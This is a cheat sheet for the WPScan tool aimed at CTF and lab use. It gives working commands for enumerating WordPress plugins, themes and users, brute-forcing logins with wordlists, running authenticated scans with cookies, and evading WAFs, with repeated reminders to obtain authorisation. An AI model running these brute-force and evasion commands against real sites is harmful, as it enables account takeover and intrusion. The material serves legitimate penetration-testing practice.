# WPScan Cheat Sheet — Enumeration & Bruteforce (CTF/Lab Focus)

**Purpose:** Focused, practical cheat sheet for using WPScan to enumerate WordPress installations (themes, plugins, users, versions) and perform controlled brute‑force attacks. Includes examples, parsing tips, and safety notes.

---

## Installation
On Debian/Ubuntu/Kali:
```bash
sudo apt update
sudo apt install wpscan
# or install latest via gem if preferred
# gem install wpscan
```

---

## Quick syntax refresher
```bash
wpscan --url <URL> [options]
```

---

## Enumeration flags (what they do)
Use `--enumerate` with one or more letters (comma-separated or without spaces):

- `p` — plugins (enumerate installed plugins).  
- `t` — themes (enumerate installed themes).  
- `u` — users (enumerate usernames).  
- `v` — vulnerabilities (use with other args to check WPVulnDB).  
- `vp` — plugins + vulnerability cross‑check (requires `--api-token`).  
- `vt` — themes + vulnerability cross‑check.  

Examples:
```bash
wpscan --url http://target.site --enumerate p
wpscan --url http://target.site --enumerate t
wpscan --url http://target.site --enumerate u
wpscan --url http://target.site --enumerate u,p,t
# Check plugins against WPVulnDB (requires API token)
wpscan --url http://target.site --enumerate vp --api-token YOUR_WPVULNDB_TOKEN
```

**How WPScan finds results**
- Checks `/wp-content/plugins/<plugin>/` known locations.
- Requests `readme.txt` or plugin files to extract version strings.
- Parses embedded assets (CSS/JS) and `link`/`script` tags for theme/plugin names.
- Enumerates author endpoints (`/author/<name>`, REST API) for usernames.
- Reports the detection method (e.g., _Detected by: Readme_, _Known location_, _Embedded asset_).

---

## Example enumeration workflows

### 1) Quick reconnaissance (light & fast)
```bash
wpscan --url http://10.10.10.10 --enumerate t,p,u -o wpscan_quick.txt
```

### 2) Aggressive plugin detection (CTF)
```bash
wpscan --url http://target.ctf --enumerate p --plugins-detection aggressive -o wpscan_plugins.txt
```

### 3) Vulnerability check (WPVulnDB)
```bash
wpscan --url http://target.ctf --enumerate vp --api-token YOUR_WPVULNDB_TOKEN -o wpscan_vulns.txt
```

---

## Bruteforce (Password Attacks) — responsible use only
WPScan supports password bruteforce against WordPress login. Use only on targets you own or are authorized to test.

### Single username, wordlist
```bash
wpscan --url http://target.site --usernames admin --passwords /usr/share/wordlists/rockyou.txt
```

### Multiple usernames and multiple passwords
Prepare `users.txt` and `passwords.txt`:
```bash
wpscan --url http://target.site --usernames users.txt --passwords passwords.txt
```

### Using enumerated users as input (pipe-style workflow)
1. Enumerate users to file:
```bash
wpscan --url http://target.site --enumerate u -o users_raw.txt
```
2. Extract usernames (parse output) and run bruteforce:
```bash
# simple grep/awk may be required depending on version output format
grep -i 'Username' users_raw.txt | awk '{print $2}' > users.txt
wpscan --url http://target.site --usernames users.txt --passwords /usr/share/wordlists/rockyou.txt
```

**Notes & flags for bruteforce**
- `--usernames` accepts a single username or a file with usernames.  
- `--passwords` accepts a password list file.  
- You may combine with `--proxy` to route through Burp for inspection: `--proxy http://127.0.0.1:8080`.  
- Use `--cookie 'NAME=VAL'` for authenticated scans or to reuse session context.

---

## Authentication & authenticated enumeration
If you have valid credentials or a session cookie, use them to perform authenticated enumeration (often returns more info):

```bash
# cookie-based authenticated scan
wpscan --url http://target.site --cookie 'wordpress_logged_in=abcd1234' --enumerate p,t -o wpscan_auth.txt

# username/password combo to login then enumerate (if supported in your version)
# Note: check --help; some versions allow --login and --password flags for authenticated checks
```

Authenticated scans can reveal admin‑only plugins, user lists, and settings.

---

## Throttling, stealth, and avoiding WAFs
WPScan aims to be low-noise by default. For CTFs you can be more aggressive; on real targets be cautious.

- Increase detection aggressiveness:
```bash
--plugins-detection aggressive
```
- Randomize user agent to avoid simple blocks:
```bash
--random-agent
```
- Use `--proxy` to inspect traffic in Burp, or to route through a VPN:
```bash
--proxy http://127.0.0.1:8080
```
- If you need to slow requests, use external rate control (e.g., `pv` or `sleep` loops) because some versions don't include a built-in throttle flag. Example simple wrapper:

```bash
# naive throttled loop for passwords (when WPScan lacks throttle)
while read pwd; do
  wpscan --url http://target.site --usernames admin --passwords <(echo "$pwd")
  sleep 0.5
done < /path/to/passwords.txt
```

---

## Parsing & triage tips
- Save output to a file with `-o` or `--output` for later parsing.
- Grep for keywords:
```bash
grep -i 'Found:' wpscan_quick.txt
grep -i 'Vulnerable' wpscan_vulns.txt
```
- WPScan annotates detection method — use that to prioritize manual verification (e.g., a plugin confirmed via `readme` is high confidence).

---

## Common pitfalls & how to handle them
- **False positives:** WPScan may show plugin/theme names from CDN or bundled assets; verify by fetching plugin path `/wp-content/plugins/<name>/readme.txt`.  
- **Missing results due to WAF:** If a WAF blocks probes, try authenticated scans, slower probing, or use `--random-agent`. Always have permission.  
- **No users found:** Some sites hide author pages or REST API; try common author enumeration patterns or check `/wp-json/wp/v2/users`.  
- **Version not reported:** Try requesting `/wp-content/plugins/<plugin>/readme.txt` or check asset file headers for version strings.

---

## Combining WPScan with other tools
- **Manual inspection:** Browser DevTools (Network tab) to locate theme/plugin asset paths.  
- **Burp Suite / Proxy:** Use `--proxy` to route WPScan traffic through Burp for deeper analysis.  
- **Hydra / Medusa / Burp Intruder:** Alternative bruteforce tools if you want parallelization or different password attack strategies (ensure authorization).  
- **wp-login.php vs XML-RPC:** Some sites allow authentication via XML-RPC; consider alternative endpoints if wp-login is protected.

---

## Example end-to-end CTF flow
1. Quick enumeration:
```bash
wpscan --url http://target.ctf --enumerate t,p,u -o initial.txt
```
2. Check identified plugins for vulns with WPVulnDB (if token available):
```bash
wpscan --url http://target.ctf --enumerate vp --api-token YOUR_WPVULNDB_TOKEN -o vulns.txt
```
3. Extract usernames and run bruteforce (if permitted):
```bash
# parse usernames from initial.txt into users.txt, then:
wpscan --url http://target.ctf --usernames users.txt --passwords /usr/share/wordlists/rockyou.txt -o bruteforce.txt
```
4. If creds found, re-run authenticated enumeration:
```bash
wpscan --url http://target.ctf --cookie 'wordpress_logged_in=FOUND_COOKIE' --enumerate p,t -o post_auth.txt
```

---

## Safety, Ethics & Legal
- Only test systems you own or have explicit permission to test. Bruteforce attacks and aggressive probes can be illegal and disruptive.  
- In CTF/lab environments: increase aggressiveness and threads as needed. On production: coordinate, get written permission, and be conservative.

---

## Quick reference commands (summary)
```bash
# Enumerate plugins, themes, users
wpscan --url http://target --enumerate p,t,u

# Aggressive plugin detection
wpscan --url http://target --enumerate p --plugins-detection aggressive

# Vulnerability check via WPVulnDB (requires token)
wpscan --url http://target --enumerate vp --api-token YOUR_WPVULNDB_TOKEN

# Brute force single user with rockyou
wpscan --url http://target --usernames admin --passwords /usr/share/wordlists/rockyou.txt

# Brute force multiple users/passwords
wpscan --url http://target --usernames users.txt --passwords passwords.txt

# Authenticated scan using cookie
wpscan --url http://target --cookie 'wordpress_logged_in=abcd1234' --enumerate p,t -o auth.txt
```

---

*End of WPScan enumeration & bruteforce cheat sheet.*
